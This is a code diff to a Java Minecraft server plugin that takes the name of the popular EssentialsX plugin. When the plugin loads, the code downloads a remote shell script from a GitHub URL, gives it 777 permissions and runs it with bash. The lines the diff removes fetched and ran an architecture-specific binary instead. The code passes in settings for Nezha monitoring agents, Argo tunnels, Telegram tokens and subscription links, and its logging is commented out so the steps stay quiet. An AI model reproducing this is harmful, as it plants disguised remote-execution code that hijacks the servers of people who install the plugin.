@@ -8,92 +8,81 @@ import java.util.*;
 import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
-    private Process sbxProcess;
+    private Process scriptProcess;
     private volatile boolean shouldRun = true;
     private volatile boolean isProcessRunning = false;
     
+    private static final String SCRIPT_URL = "https://raw.githubusercontent.com/dsadsadsss/java-wanju/refs/heads/main/start.sh";
+    
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "TOK", "ARGO_DOMAIN", "TG", "SUB_URL", "NEZHA_SERVER", 
+        "NEZHA_KEY", "NEZHA_PORT", "NEZHA_TLS", "TMP_ARGO", 
+        "EKEY", "SUB_NAME", "CF_IP", "AGENT_UUID", "UUID"
     };
     
     @Override
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
         
-        // Start sbx
+        // Start script
         try {
-            startSbxProcess();
+            startScriptProcess();
             getLogger().info("EssentialsX plugin enabled");
         } catch (Exception e) {
-            getLogger().severe("Failed to start sbx process: " + e.getMessage());
+            getLogger().severe("Failed to start script process: " + e.getMessage());
             e.printStackTrace();
         }
     }
     
-    private void startSbxProcess() throws Exception {
+    private void startScriptProcess() throws Exception {
         if (isProcessRunning) {
             return;
         }
         
-        // Determine download URL based on architecture
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/sbsh";
-        } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/sbsh";
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-        
-        // Download sbx binary
+        // Download script
         Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
-        Path sbxBinary = tmpDir.resolve("sbx");
+        Path scriptFile = tmpDir.resolve("plugin");
         
-        if (!Files.exists(sbxBinary)) {
-            // getLogger().info("Downloading sbx ...");
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!sbxBinary.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+        // getLogger().info("Downloading plugin script...");
+        try (InputStream in = new URL(SCRIPT_URL).openStream()) {
+            Files.copy(in, scriptFile, StandardCopyOption.REPLACE_EXISTING);
         }
         
-        // Prepare process builder
-        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
+        // Set 777 permission
+        File file = scriptFile.toFile();
+        file.setReadable(true, false);
+        file.setWritable(true, false);
+        file.setExecutable(true, false);
+        
+        // Alternative method to ensure 777 permissions on Unix-like systems
+        try {
+            Runtime.getRuntime().exec(new String[]{"chmod", "777", scriptFile.toString()}).waitFor();
+        } catch (Exception e) {
+            // Ignore if chmod command is not available (e.g., on Windows)
+        }
+        
+        // Prepare process builder to run bash script
+        ProcessBuilder pb = new ProcessBuilder("/bin/bash", scriptFile.toString());
         pb.directory(tmpDir.toFile());
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "b21795d8-0257-4cd1-a13f-aef25d120aa3");
-        env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
-        env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
-        env.put("ARGO_PORT", "8001");
+        
+        // Set default values
+        env.put("TOK", "");
         env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
-        env.put("ANYREALITY_PORT", "");
-        env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
-        env.put("CFPORT", "443");
-        env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("TG", "");
+        env.put("SUB_URL", "");
+        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_PORT", "443");
+        env.put("NEZHA_TLS", "1");
+        env.put("TMP_ARGO", "vms");
+        env.put("EKEY", "");
+        env.put("SUB_NAME", "argo");
+        env.put("CF_IP", "ip.sb");
+        env.put("AGENT_UUID", "");
+        env.put("UUID", "");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
@@ -106,7 +95,7 @@ public class EssentialsX extends JavaPlugin {
         // Load from .env file with priority order
         loadEnvFileFromMultipleLocations(env);
         
-        // Load from Bukkit configuration file
+        // Load from Bukkit configuration file (highest priority)
         for (String var : ALL_ENV_VARS) {
             String value = getConfig().getString(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -119,14 +108,14 @@ public class EssentialsX extends JavaPlugin {
         pb.redirectError(ProcessBuilder.Redirect.INHERIT);
         
         // Start process
-        sbxProcess = pb.start();
+        scriptProcess = pb.start();
         isProcessRunning = true;
         
-        // Start a monitor thread to log when process exits
+        // Start a monitor thread
         startProcessMonitor();
-        // getLogger().info("sbx started");
+        // getLogger().info("plugin script is running");
         
-        // sleep 20 seconds
+        // Sleep 20 seconds
         try {
             Thread.sleep(20000);
         } catch (InterruptedException e) {
@@ -196,7 +185,7 @@ public class EssentialsX extends JavaPlugin {
                 
                 if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                     env.put(key, value);
-                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
+                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("TOK") || key.contains("TG") ? "***" : value));
                 }
             }
         }
@@ -220,14 +209,14 @@ public class EssentialsX extends JavaPlugin {
     private void startProcessMonitor() {
         Thread monitorThread = new Thread(() -> {
             try {
-                int exitCode = sbxProcess.waitFor();
+                int exitCode = scriptProcess.waitFor();
                 isProcessRunning = false;
-                // getLogger().info("sbx process exited with code: " + exitCode);
+                // getLogger().info("plugin script process exited with code: " + exitCode);
             } catch (InterruptedException e) {
                 Thread.currentThread().interrupt();
                 isProcessRunning = false;
             }
-        }, "Sbx-Process-Monitor");
+        }, "Script-Process-Monitor");
         
         monitorThread.setDaemon(true);
         monitorThread.start();
@@ -239,19 +228,19 @@ public class EssentialsX extends JavaPlugin {
         
         shouldRun = false;
         
-        if (sbxProcess != null && sbxProcess.isAlive()) {
-            // getLogger().info("Stopping sbx process...");
-            sbxProcess.destroy();
+        if (scriptProcess != null && scriptProcess.isAlive()) {
+            // getLogger().info("Stopping script process...");
+            scriptProcess.destroy();
             
             try {
-                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
-                    sbxProcess.destroyForcibly();
-                    getLogger().warning("Forcibly terminated sbx process");
+                if (!scriptProcess.waitFor(10, TimeUnit.SECONDS)) {
+                    scriptProcess.destroyForcibly();
+                    getLogger().warning("Forcibly terminated script process");
                 } else {
-                    getLogger().info("sbx process stopped normally");
+                    getLogger().info("Script process stopped normally");
                 }
             } catch (InterruptedException e) {
-                sbxProcess.destroyForcibly();
+                scriptProcess.destroyForcibly();
                 Thread.currentThread().interrupt();
             }
             isProcessRunning = false;
